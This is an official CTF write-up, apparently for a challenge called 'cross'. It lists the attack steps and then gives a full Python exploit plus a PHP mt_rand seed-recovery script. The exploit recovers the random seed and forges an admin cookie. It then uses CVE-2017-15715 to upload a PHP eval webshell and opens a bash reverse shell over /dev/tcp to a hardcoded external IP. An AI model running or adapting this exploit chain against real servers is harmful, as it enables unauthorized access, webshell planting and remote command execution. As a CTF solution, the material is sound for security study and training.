# cross 官方wp

考点都是很套路很固定的,这里丢个exp,考点有如下:

1. [无需爆破还原mt_rand()种子](https://www.anquanke.com/post/id/196831?from=timeline)
2. 根据提示简单地越权,修改cookie
3. 使用CVE-2017-15715上传webshell
4. webshell反弹shell,获取交互式shell,通过简单的linux命令寻找属于liuzhuang用户的文件,并从中找到密码
5. su到liuzhuang然后读根目录下的flag

```php
# exp.py
from base64 import b64encode
from os import remove
from subprocess import check_output
from threading import Thread
from time import sleep

import requests

from reverse_mt_rand import main as reverse


def reverse_shell(ip, port):
    print(f"try to reverse {ip}:{port}")
    try:
        requests.post(webshellurl, data={
                        "a": f"""system("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");"""})
    except Exception:
        return


# 修改这里
ip = "120.27.146.26"  # 反弹ip
port = "23334"  # 反弹端口
url = "http://173.82.206.142:8001/front/index.php"
webshellname = "test.php"


#
adminurl = "/".join(url.split("/")[:-2]) + "/admin/index.php"
uploadurl = "/".join(url.split("/")[:-2]) + "/admin/upload.php"
webshellurl = "/".join(url.split("/")[:-2]) + \
    "/upload/" + webshellname + chr(10)

s = requests.Session()

# 获取cookie
s.get(url)
# 获取随机数文件
res = s.post(url, data={"get_code": True, "length": 228})
result = res.json()['content']
numbers = result.split(" ")
# 读取1和228个随机数
a, b = int(numbers[0]), int(numbers[-1])
# 计算seed
seed = reverse(a, b, 0, 0)
print("seed is %d" % seed)
# 获得第301个随机数
code = "<?php mt_srand(%d);for($i=0;$i<300;$i++){$b=mt_rand();}echo mt_rand();" % seed
with open("test.php", "w+") as f:
    f.write(code)
result = int(check_output('php test.php').decode())
remove("test.php")
print("301 number is %d" % result)

# 发送正确答案
res = s.post(url, data={"rand": result})
res.encoding = res.apparent_encoding
print(res.text)
if ("failed" in res.text):
    print("答案错误请重试")
    exit(1)
# 请求后台
cookies = s.cookies.get_dict()
print("cookies:\n", cookies)
# 越权
cookies['Username'] = b64encode("x1hy9".encode()).decode()

# CVE-2017-15715
with open(webshellname, "w+") as f:
    f.write("<?php eval($_POST['a']); ?>")

res = requests.post(uploadurl, data={
                    "name": webshellname + chr(10)}, cookies=cookies, files={"file": ("test.php", open(webshellname, "r"))})
print(res, "\n", res.text)

# 反弹shell
t = Thread(target=reverse_shell, args=(ip, port))
t.setDaemon(True)
t.start()
# 善后
remove("test.php")
print("Ctrl+c to leave")
try:
    while True:
        sleep(60)
except (KeyboardInterrupt, EOFError):
    pass
print("Bye")

```

```python
# reverse_mt_rand.py
# Charles Fol
# @cfreal_
# 2020-01-04 (originally la long time ago ~ 2010)
# Breaking mt_rand() with two output values and no bruteforce.
#
"""
R = final rand value
S = merged state value
s = original state value
"""

import random
import sys

N = 624
M = 397

MAX = 0xffffffff
MOD = MAX + 1


# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)
STATE_MULT = 1812433253
STATE_MULT_INV = 2520285293

MT_RAND_MT19937 = 1
MT_RAND_PHP = 0


def php_mt_initialize(seed):
    """Creates the initial state array from a seed.
    """
    state = [None] * N
    state[0] = seed & 0xffffffff;
    for i in range(1, N):
        r = state[i-1]
        state[i] = ( STATE_MULT * ( r ^ (r >> 30) ) + i ) & MAX
    return state


def undo_php_mt_initialize(s, p):
    """From an initial state value `s` at position `p`, find out seed.
    """
    # We have:
    # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] >> 30) + i )) % 100000000
    # and:
    # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)
    # => 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] >> 30) ) (mod 100000000)
    for i in range(p, 0, -1):
        s = _undo_php_mt_initialize(s, i)
    return s


def _undo_php_mt_initialize(s, i):
    s = (STATE_MULT_INV * (s - i)) & MAX
    return s ^ s >> 30


def php_mt_rand(s1):
    """Converts a merged state value `s1` into a random value, then sent to the
    user.
    """
    s1 ^= (s1 >> 11)
    s1 ^= (s1 <<  7) & 0x9d2c5680
    s1 ^= (s1 << 15) & 0xefc60000
    s1 ^= (s1 >> 18)
    return s1


def undo_php_mt_rand(s1):
    """Retrieves the merged state value from the value sent to the user.
    """
    s1 ^= (s1 >> 18)
    s1 ^= (s1 << 15) & 0xefc60000
    
    s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680)
    
    s1 ^= s1 >> 11
    s1 ^= s1 >> 22
    
    return s1

def undo_lshift_xor_mask(v, shift, mask):
    """r s.t. v = r ^ ((r << shift) & mask)
    """
    for i in range(shift, 32, shift):
        v ^= (bits(v, i - shift, shift) & bits(mask, i, shift)) << i
    return v

def bits(v, start, size):
    return lobits(v >> start, size)


def lobits(v, b):
    return v & ((1 << b) - 1)


def bit(v, b):
    return v & (1 << b)


def bv(v, b):
    return bit(v, b) >> b


def php_mt_reload(state, flavour):
    s = state
    for i in range(0, N - M):
        s[i] = _twist_php(s[i+M], s[i], s[i+1], flavour)
    for i in range(N - M, N - 1):
        s[i] = _twist_php(s[i+M-N], s[i], s[i+1], flavour)


def _twist_php(m, u, v, flavour):
    """Emulates the `twist` and `twist_php` #defines.
    """
    mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) & 1 else 0
    return m ^ (((u & 0x80000000) | (v & 0x7FFFFFFF)) >> 1) ^ mask


def undo_php_mt_reload(S000, S227, offset, flavour):
    #define twist_php(m,u,v)  (m ^ (mixBits(u,v)>>1) ^ ((uint32_t)(-(int32_t)(loBit(u))) & 0x9908b0dfU))
    # m S000
    # u S227
    # v S228
    X = S000 ^ S227
    
    # This means the mask was applied, and as such that S227's LSB is 1
    s22X_0 = bv(X, 31)
    # remove mask if present
    if s22X_0:
        X ^= 0x9908b0df

    # Another easy guess
    s227_31 = bv(X, 30)
    # remove bit if present
    if s227_31:
        X ^= 1 << 30

    # We're missing bit 0 and bit 31 here, so we have to try every possibility
    s228_1_30 = (X << 1)
    for s228_0 in range(2):
        for s228_31 in range(2):
            if flavour == MT_RAND_MT19937 and s22X_0 != s228_0:
                continue
            s228 = s228_0 | s228_31 << 31 | s228_1_30

            # Check if the results are consistent with the known bits of s227
            s227 = _undo_php_mt_initialize(s228, 228 + offset)
            if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0:
                continue
            if bv(s227, 31) != s227_31:
                continue
            
            # Check if the guessed seed yields S000 as its first scrambled state
            rand = undo_php_mt_initialize(s228, 228 + offset)
            state = php_mt_initialize(rand)
            php_mt_reload(state, flavour)
            
            if not (S000 == state[offset]):
                continue
            
            return rand
    return None


def main(_R000, _R227, offset, flavour):
    # Both were >> 1, so the leftmost byte is unknown
    _R000 <<= 1
    _R227 <<= 1
    
    for R000_0 in range(2):
        for R227_0 in range(2):
            R000 = _R000 | R000_0
            R227 = _R227 | R227_0
            S000 = undo_php_mt_rand(R000)
            S227 = undo_php_mt_rand(R227)
            seed = undo_php_mt_reload(S000, S227, offset, flavour)
            if seed:
                return seed


def test_do_undo(do, undo):
    for i in range(10000):
        rand = random.randrange(1, MAX)
        done = do(rand)
        undone = undo(done)
        if not rand == undone:
            print(f"-- {i} ----")
            print(bin(rand).rjust(34))
            print(bin(undone).rjust(34))
            break

def test():
    test_do_undo(
        php_mt_initialize,
        lambda s: undo_php_mt_initialize(s[227], 227)
    )
    test_do_undo(
        php_mt_rand,
        undo_php_mt_rand
    )
    exit()


```

